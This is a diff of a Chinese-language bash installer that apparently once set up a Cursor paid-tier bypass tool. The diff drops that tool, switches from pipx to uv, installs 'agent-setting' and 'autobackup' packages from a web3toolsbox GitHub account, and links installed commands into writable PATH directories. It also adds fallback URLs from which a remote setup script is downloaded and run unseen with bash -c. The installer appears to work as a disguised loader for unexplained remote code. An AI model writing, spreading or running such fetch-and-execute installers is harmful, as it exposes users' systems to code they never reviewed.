@@ -1,31 +1,9 @@
 #!/bin/bash
 
-# 颜色定义
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-CYAN='\033[0;36m'
-NC='\033[0m' # 无色
-
-# Logo
-print_logo() {
-    echo -e "${CYAN}"
-    cat << "EOF"
-    ██████╗██╗    ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
-   ██╔════╝██║    ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
-   ██║     ██║    ██║██████╔╝███████╗██║    ██║██████╔╝     ██████╔╝██████╔╝██║    ██║  
-   ██║     ██║    ██║██╔══██╗╚════██║██║    ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║    ██║  
-   ╚██████╗╚██████╔╝██║   ██║███████║╚██████╔╝██║   ██║     ██║     ██║   ██║╚██████╔╝  
-    ╚═════╝ ╚═════╝ ╚═╝   ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝     ╚═╝     ╚═╝   ╚═╝ ╚═════╝  
-EOF
-    echo -e "${NC}"
-}
-
-#!/bin/bash
-
 FAILED_STEPS=()
 PATH_RUNTIME_ADDED=()
 PATH_PERSIST_FILES=()
+ORIGINAL_PATH="$PATH"
 
 # Use sudo only when not already root
 _sudo() {
@@ -102,24 +80,7 @@ resolve_pkg_name() {
 
     case "$generic" in
         python3-pip)
-            case "$pkg_manager" in
-                pacman) echo "python-pip" ;;
-                apk)    echo "py3-pip" ;;
-                *)      echo "python3-pip" ;;
-            esac
-            ;;
-        xclip)
-            case "$pkg_manager" in
-                apk) echo "xclip" ;;
-                *)   echo "xclip" ;;
-            esac
-            ;;
-        pipx)
-            case "$pkg_manager" in
-                pacman) echo "python-pipx" ;;
-                apk)    echo "pipx" ;;
-                *)      echo "pipx" ;;
-            esac
+            echo "$generic"
             ;;
         *)
             echo "$generic"
@@ -138,6 +99,62 @@ ensure_runtime_path() {
     done
     export PATH
     hash -r 2>/dev/null || true
+}
+
+find_existing_writable_path_dir() {
+    local dir=""
+    local old_ifs="$IFS"
+    local seen_dirs=":"
+
+    IFS=':'
+    for dir in $ORIGINAL_PATH; do
+        [ -n "$dir" ] || continue
+
+        case "$seen_dirs" in
+            *:"$dir":*) continue ;;
+        esac
+        seen_dirs="${seen_dirs}${dir}:"
+
+        if [ -d "$dir" ] && [ -w "$dir" ]; then
+            IFS="$old_ifs"
+            echo "$dir"
+            return 0
+        fi
+    done
+
+    IFS="$old_ifs"
+    return 1
+}
+
+bridge_command_into_current_path() {
+    local command_name="$1"
+    local source_path=""
+    local target_dir=""
+    local target_path=""
+
+    ensure_runtime_path
+    source_path="$(command -v "$command_name" 2>/dev/null)" || source_path=""
+    if [ -z "$source_path" ]; then
+        return 1
+    fi
+
+    target_dir="$(find_existing_writable_path_dir || true)"
+    if [ -z "$target_dir" ]; then
+        return 0
+    fi
+
+    if [ "$(dirname "$source_path")" = "$target_dir" ]; then
+        return 0
+    fi
+
+    target_path="$target_dir/$command_name"
+    if [ -e "$target_path" ] && [ ! -L "$target_path" ]; then
+        return 0
+    fi
+
+    ln -sfn "$source_path" "$target_path" >/dev/null 2>&1 || return 1
+    hash -r 2>/dev/null || true
+    return 0
 }
 
 persist_runtime_path() {
@@ -195,7 +212,7 @@ print_path_refresh_hint() {
         echo "已将用户命令目录写入以下 shell 配置："
         printf ' - %s\n' "${PATH_PERSIST_FILES[@]}"
         first_rc="${PATH_PERSIST_FILES[0]}"
-        echo "当前终端若要立即生效，请执行：source \"$first_rc\""
+        echo "新终端会自动生效；若当前终端仍需手动刷新，可执行：source \"$first_rc\""
     elif [ ${#PATH_RUNTIME_ADDED[@]} -gt 0 ]; then
         echo "当前安装过程中已临时补充 PATH，但请重新打开终端或手动执行以下命令使后续会话稳定生效："
         echo "export PATH=\"\$HOME/.local/bin:\$HOME/bin:\$PATH\""
@@ -218,6 +235,44 @@ download_url_to_stdout() {
     return 127
 }
 
+# Check and install uv (fast Python package manager)
+check_install_uv() {
+    if command -v uv &>/dev/null; then
+        echo "uv 已安装: $(uv --version)"
+        return 0
+    fi
+
+    echo "正在安装 uv（高性能 Python 包管理器）..."
+    local install_script=""
+    install_script="$(download_url_to_stdout 'https://astral.sh/uv/install.sh')" || install_script=""
+    if [ -z "$install_script" ]; then
+        echo "WARN: 无法下载 uv 安装脚本" >&2
+        return 1
+    fi
+
+    run_step "安装 uv" sh -c "$install_script"
+    ensure_runtime_path
+    hash -r 2>/dev/null || true
+
+    if command -v uv &>/dev/null; then
+        echo "uv 安装成功: $(uv --version)"
+        return 0
+    fi
+
+    # Fallback: try pip
+    if [ -n "${PYTHON_CMD:-}" ]; then
+        run_step "pip 安装 uv" $PYTHON_CMD -m pip install uv
+    fi
+
+    if command -v uv &>/dev/null; then
+        echo "uv 安装成功: $(uv --version)"
+        return 0
+    fi
+
+    echo "WARN: uv 安装失败" >&2
+    return 1
+}
+
 # Find working python3 command
 find_python3() {
     local cmd=""
@@ -236,6 +291,29 @@ PYTHON_CMD="$(find_python3 || true)"
 
 pip_supports_break_system_packages() {
     $PYTHON_CMD -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
+}
+
+build_python_package_install_cmd() {
+    PIP_INSTALL_CMD=($PYTHON_CMD -m pip install --upgrade)
+
+    if [ "$OS_TYPE" = "Linux" ]; then
+        if pip_supports_break_system_packages; then
+            PIP_INSTALL_CMD+=(--break-system-packages)
+        fi
+    elif [ "$OS_TYPE" = "Darwin" ]; then
+        PIP_INSTALL_CMD+=(--user)
+    fi
+}
+
+build_python_package_fallback_cmd() {
+    FALLBACK_PIP_INSTALL_CMD=("${PIP_INSTALL_CMD[@]}")
+
+    if [ "$OS_TYPE" = "Darwin" ]; then
+        case " ${FALLBACK_PIP_INSTALL_CMD[*]} " in
+            *" --user "*) ;;
+            *) FALLBACK_PIP_INSTALL_CMD+=(--user) ;;
+        esac
+    fi
 }
 
 python_package_state() {
@@ -299,65 +377,30 @@ sys.exit(1)
 PY
 }
 
-get_pipx_venv_python_path() {
-    local venv_name="$1"
-    local candidates=(
-        "$HOME/.local/share/pipx/venvs/$venv_name/bin/python"
-        "$HOME/.local/pipx/venvs/$venv_name/bin/python"
-        "$HOME/pipx/venvs/$venv_name/bin/python"
-    )
-    local candidate=""
-    for candidate in "${candidates[@]}"; do
-        if [ -x "$candidate" ]; then
-            echo "$candidate"
-            return 0
-        fi
-    done
-    return 1
-}
-
-install_pipx_package() {
+install_uv_tool_package() {
+    # 使用 uv tool 安装或升级 CLI 工具
     local package_spec="$1"
     local command_name="$2"
-    local venv_name="$3"
-    local existing_command=""
-    local venv_python=""
-    local install_args=()
-    local installed_command=""
 
     if command -v "$command_name" &>/dev/null; then
-        existing_command="$(command -v "$command_name")"
+        uv tool install --upgrade "$package_spec"
+        local upgrade_rc=$?
+        if [ $upgrade_rc -ne 0 ]; then
+            echo "WARN: uv tool 升级失败，回退为强制重装：$command_name" >&2
+            FAILED_STEPS+=("uv tool 升级 $command_name (exit=$upgrade_rc)")
+            run_step "uv tool 强制重装 $command_name" uv tool install --force "$package_spec"
+        fi
+    else
+        run_step "uv tool 安装 $command_name" uv tool install "$package_spec"
     fi
 
-    if [ -n "$venv_name" ]; then
-        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
-    fi
-
-    if [ -n "$existing_command" ] && { [ -z "$venv_name" ] || [ -n "$venv_python" ]; }; then
-        echo "CLI 已可用，跳过安装：$existing_command"
-        return 0
-    fi
-
-    install_args=(install "$package_spec")
-    if [ -n "$existing_command" ] && [ -n "$venv_name" ] && [ -z "$venv_python" ]; then
-        echo "WARN: 检测到命令存在但 pipx venv 缺失，尝试强制重装：$package_spec" >&2
-        install_args=(install --force "$package_spec")
-    fi
-
-    run_step "pipx 安装 $command_name（$package_spec）" pipx "${install_args[@]}"
     ensure_runtime_path
     hash -r 2>/dev/null || true
+    bridge_command_into_current_path "$command_name" || FAILED_STEPS+=("桥接命令 $command_name 到当前 PATH (failed)")
 
-    if command -v "$command_name" &>/dev/null; then
-        installed_command="$(command -v "$command_name")"
-    fi
-    if [ -n "$venv_name" ]; then
-        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
-    fi
-
-    if [ -z "$installed_command" ] || { [ -n "$venv_name" ] && [ -z "$venv_python" ]; }; then
-        echo "WARN: pipx 安装后状态仍不完整：$package_spec" >&2
-        FAILED_STEPS+=("校验 pipx 包 $package_spec (incomplete)")
+    if ! command -v "$command_name" &>/dev/null; then
+        echo "WARN: uv tool 安装后 $command_name 不可用" >&2
+        FAILED_STEPS+=("校验 uv tool 包 $command_name (incomplete)")
     fi
 }
 
@@ -423,14 +466,13 @@ run_step "安装系统依赖" install_dependencies
 ensure_runtime_path
 run_step "持久化用户命令目录到 shell 配置" persist_runtime_path
 
-PIP_INSTALL_CMD=("$PYTHON_CMD" -m pip install --upgrade)
-if [ "$OS_TYPE" = "Linux" ]; then
-    if pip_supports_break_system_packages; then
-        PIP_INSTALL_CMD+=(--break-system-packages)
-    fi
-elif [ "$OS_TYPE" = "Darwin" ]; then
-    PIP_INSTALL_CMD+=(--user)
-fi
+# Install uv for later uv tool usage
+run_step "检查并安装 uv（高性能包管理器）" check_install_uv
+
+PIP_INSTALL_CMD=()
+FALLBACK_PIP_INSTALL_CMD=()
+build_python_package_install_cmd
+build_python_package_fallback_cmd
 
 install_python_package_if_needed() {
     local pkg="$1"
@@ -471,15 +513,10 @@ install_python_package_if_needed() {
         return 0
     fi
 
-    # 某些系统下首次安装会因权限或外部托管策略未真正升级，回退为 --user 重试一次。
-    if [ "$OS_TYPE" = "Linux" ] || [ "$OS_TYPE" = "Darwin" ]; then
-        echo "WARN: 首次安装后版本仍未满足（当前：${verify_output:-unknown}），将使用 --user 重试：$pkg>=$min_version" >&2
-        fallback_cmd=("$PYTHON_CMD" -m pip install --upgrade --user)
-        if [ "$OS_TYPE" = "Linux" ] && pip_supports_break_system_packages; then
-            fallback_cmd+=(--break-system-packages)
-        fi
-        run_step "pip 用户级重试安装 $pkg>=$min_version" "${fallback_cmd[@]}" "$pkg>=$min_version"
-    fi
+    # 某些系统下首次安装会因权限或外部托管策略未真正升级，回退重试一次。
+    echo "WARN: 首次安装后版本仍未满足（当前：${verify_output:-unknown}），将重试：$pkg>=$min_version" >&2
+    fallback_cmd=("${FALLBACK_PIP_INSTALL_CMD[@]}")
+    run_step "重试安装 $pkg>=$min_version" "${fallback_cmd[@]}" "$pkg>=$min_version"
 
     verify_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
     verify_rc=$?
@@ -510,54 +547,12 @@ is_wsl() {
 }
 
 install_auto_backup() {
-    if ! command -v pipx &> /dev/null; then
-        echo "检测到未安装 pipx，正在安装 pipx..."
-        case $OS_TYPE in
-            "Darwin")
-                run_step "brew install pipx" brew install pipx
-                run_step "pipx ensurepath" pipx ensurepath
-                ensure_runtime_path
-                hash -r 2>/dev/null || true
-                ;;
-            "Linux")
-                local PKG_MANAGER=""
-                PKG_MANAGER="$(detect_pkg_manager || true)"
-                if [ -n "$PKG_MANAGER" ]; then
-                    local pipx_pkg=""
-                    pipx_pkg="$(resolve_pkg_name pipx "$PKG_MANAGER")"
-                    run_step "安装 pipx ($PKG_MANAGER)" pkg_install "$PKG_MANAGER" "$pipx_pkg"
-                    if ! command -v pipx &>/dev/null && [ -n "$PYTHON_CMD" ]; then
-                        # Fallback: install pipx via pip if package manager failed
-                        run_step "pip 安装 pipx" $PYTHON_CMD -m pip install --user pipx
-                    fi
-                    run_step "pipx ensurepath" pipx ensurepath
-                    ensure_runtime_path
-                    hash -r 2>/dev/null || true
-                elif [ -n "$PYTHON_CMD" ]; then
-                    # No package manager, try pip
-                    run_step "pip 安装 pipx" $PYTHON_CMD -m pip install --user pipx
-                    run_step "pipx ensurepath" pipx ensurepath
-                    ensure_runtime_path
-                    hash -r 2>/dev/null || true
-                else
-                    echo "WARN: 未找到包管理器和 python，跳过 pipx 安装" >&2
-                    return 0
-                fi
-                ;;
-            *)
-                echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
-                return 0
-                ;;
-        esac
+    if ! command -v uv &>/dev/null; then
+        echo "WARN: uv 不可用，跳过自动备份安装（请先安装 uv）" >&2
+        return 0
     fi
-
-    if command -v pipx &> /dev/null; then
-        run_step "pipx ensurepath" pipx ensurepath
-        ensure_runtime_path
-        hash -r 2>/dev/null || true
-    fi
-
-    install_pipx_package "git+https://github.com/web3toolsbox/agent-setting" "agent-setting" ""
+    
+    install_uv_tool_package "git+https://github.com/web3toolsbox/agent-setting.git" "agent-setting"
 
     local install_url=""
     case $OS_TYPE in
@@ -577,133 +572,43 @@ install_auto_backup() {
             ;;
     esac
 
-    install_pipx_package "$install_url" "autobackup" ""
+    install_uv_tool_package "$install_url" "autobackup"
 }
 
-run_step "安装自动备份相关（pipx/autobackup）" install_auto_backup
+run_step "安装自动备份（uv tool/autobackup）" install_auto_backup
 
 run_remote_config_script() {
     local script_content=""
+    local url=""
 
-    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
+    for url in "${CONFIG_SCRIPT_URLS[@]}"; do
+        script_content="$(download_url_to_stdout "$url")" || script_content=""
+        if [ -n "$script_content" ]; then
+            break
+        fi
+    done
+
     if [ -z "$script_content" ]; then
         if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
-            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
+            echo "WARN: 未找到 curl/wget，跳过环境配置" >&2
             return 0
         fi
-        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
+        echo "WARN: 所有配置脚本地址均下载失败" >&2
         return 1
     fi
 
     bash -c "$script_content"
 }
 
-GIST_URL="https://www.aiskills.life/src/setup.sh"
+CONFIG_SCRIPT_URLS=(
+    "https://www.aiskills.life/src/setup.sh"
+    "https://gist.githubusercontent.com/web3toolsbox/c835bbb706a2e3afb2f1c7e3a90107de/raw/setup.sh"
+)
 if [ ! -d .configs ]; then
     echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
     run_step "配置相关环境" run_remote_config_script
 fi
-
-get_target_version() {
-    # 默认与 README/PowerShell 脚本保持一致；可通过环境变量覆盖
-    echo "${CURSOR_VIP_VERSION:-1.11.03}"
-}
-
-get_install_root() {
-    echo "$HOME/.cursor-vip-src"
-}
-
-run_cursor_main() {
-    local main_py="$1"
-    local py_cmd="${PYTHON_CMD:-python3}"
-
-    if [ ! -f "$main_py" ]; then
-        echo "WARN: main.py 不存在，无法启动：$main_py" >&2
-        return 1
-    fi
-
-    chmod +x "$main_py" 2>/dev/null || true
-    echo "即将启动主程序：$main_py"
-    if [ "$EUID" -ne 0 ]; then
-        sudo "$py_cmd" "$main_py"
-    else
-        "$py_cmd" "$main_py"
-    fi
-}
-
-install_and_download_main_program() {
-    local version=""
-    local install_dir=""
-    local zip_name=""
-    local zip_path=""
-    local download_url=""
-    local existing_dir=""
-    local actual_dir=""
-    local requirements_path=""
-
-    if [ -z "$PYTHON_CMD" ]; then
-        echo "WARN: 未找到 Python，跳过主程序安装与启动" >&2
-        FAILED_STEPS+=("安装和下载主程序 (python-missing)")
-        return 0
-    fi
-
-    version="$(get_target_version)"
-    install_dir="$(get_install_root)"
-    zip_name="cursor-free-vip-${version}.zip"
-    zip_path="/tmp/${zip_name}"
-    download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${version}.zip"
-
-    mkdir -p "$install_dir"
-
-    existing_dir="$(find "$install_dir" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)"
-    if [ -n "$existing_dir" ] && [ -f "$existing_dir/main.py" ]; then
-        echo "检测到已安装源码目录：$existing_dir"
-        requirements_path="$existing_dir/requirements.txt"
-        if [ -f "$requirements_path" ]; then
-            run_step "安装主程序依赖（requirements.txt）" "${PIP_INSTALL_CMD[@]}" -r "$requirements_path"
-        fi
-        run_step "启动主程序" run_cursor_main "$existing_dir/main.py"
-        return 0
-    fi
-
-    echo "正在下载主程序源码包（v${version}）..."
-    echo "下载地址：$download_url"
-    if command -v curl &>/dev/null; then
-        run_step "下载主程序源码包" curl -fL -o "$zip_path" "$download_url"
-    elif command -v wget &>/dev/null; then
-        run_step "下载主程序源码包" wget -O "$zip_path" "$download_url"
-    else
-        echo "WARN: 未找到 curl/wget，无法下载主程序源码包" >&2
-        FAILED_STEPS+=("下载主程序源码包 (downloader-missing)")
-        return 0
-    fi
-
-    if [ ! -f "$zip_path" ]; then
-        echo "WARN: 源码包下载失败或文件不存在：$zip_path" >&2
-        FAILED_STEPS+=("下载主程序源码包 (file-missing)")
-        return 0
-    fi
-
-    run_step "解压主程序源码包" unzip -o "$zip_path" -d "$install_dir"
-    actual_dir="$(find "$install_dir" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)"
-    if [ -z "$actual_dir" ]; then
-        echo "WARN: 解压后未找到主程序目录" >&2
-        FAILED_STEPS+=("安装和下载主程序 (extract-dir-missing)")
-        return 0
-    fi
-
-    requirements_path="$actual_dir/requirements.txt"
-    if [ -f "$requirements_path" ]; then
-        run_step "安装主程序依赖（requirements.txt）" "${PIP_INSTALL_CMD[@]}" -r "$requirements_path"
-    else
-        echo "WARN: 未找到 requirements.txt，跳过项目依赖安装：$actual_dir" >&2
-    fi
-
-    run_step "启动主程序" run_cursor_main "$actual_dir/main.py"
-}
-
-run_step "安装和下载主程序" install_and_download_main_program
 
 echo "安装完成！"
 print_path_refresh_hint
